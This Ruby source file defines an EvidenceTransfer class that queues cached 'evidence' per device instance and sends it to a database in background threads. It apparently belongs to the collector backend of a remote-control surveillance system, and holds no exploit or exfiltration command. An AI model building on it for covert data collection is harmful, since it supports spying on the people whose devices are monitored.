#
#  Evidence Transfer module for transferring evidence to the db
#

require_relative 'db.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence_manager'
require 'rcs-common/flatsingleton'
require 'rcs-common/fixnum'

# from system
require 'thread'

module RCS
module Collector

class EvidenceTransfer
  include Singleton
  extend FlatSingleton
  include RCS::Tracer

  def initialize
    @evidences = {}
    @worker = Thread.new { self.work }
    # the mutex to avoid race conditions
    @semaphore = Mutex.new
  end

  def send_cached
    trace :info, "Transferring cached evidence to the db..."

    # for every instance, get all the cached evidence and send them
    EvidenceManager.instances.each do |instance|
      EvidenceManager.evidence_ids(instance).each do |id|
        self.queue instance, id
      end
    end

  end

  def queue(instance, id)
    # add the id to the queue
    @semaphore.synchronize do
      @evidences[instance] ||= []
      @evidences[instance] << id
    end
  end

  def work
    # infinite loop for working
    loop do
      # pass the control to other threads
      sleep 1

      # keep an eye on race conditions...
      # copy the value and don't keep the resource locked too long
      instances = @semaphore.synchronize { @evidences.each_key.to_a }

      # for each instance get the ids we have and send them
      instances.each do |instance|
        # one thread per instance
        threads = []
        threads << Thread.new do
          begin
            # only perform the job if we have something to transfer
            if not @evidences[instance].empty? then
              # get the info from the instance
              info = EvidenceManager.instance_info instance

              # make sure that the symbols are present
              # we are doing this hack since we are passing information taken from the store
              # and passing them as they were a session
              info[:bid] = info['bid']
              info[:instance] = info['instance']
              info[:build] = info['build']
              info[:subtype] = info['subtype']

              # update the status in the db
              DB.sync_start info, info['version'], info['user'], info['device'], info['source'], info['sync_time']

              # transfer all the evidence
              while (id = @evidences[instance].shift)
                self.transfer instance, id, @evidences[instance].count
              end

              # the sync is ended
              DB.sync_end info
            end
          rescue Exception => e
            trace :error, "Error processing evidences: #{e.message}"
          ensure
            # job done, exit
            Thread.exit
          end
        end
        # wait for all the threads to die
        threads.each { |t| t.join }
      end
    end
  end

  def transfer(instance, id, left)
    evidence = EvidenceManager.get_evidence(id, instance)

    trace :info, "Transferring [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"

    # send and delete the evidence
    ret, error = DB.send_evidence(instance, evidence)

    if ret then
      EvidenceManager.del_evidence(id, instance)
    else
      trace :error, "Evidence NOT transferred: #{error}"
    end
    
  end

end
  
end #Collector::
end #RCS::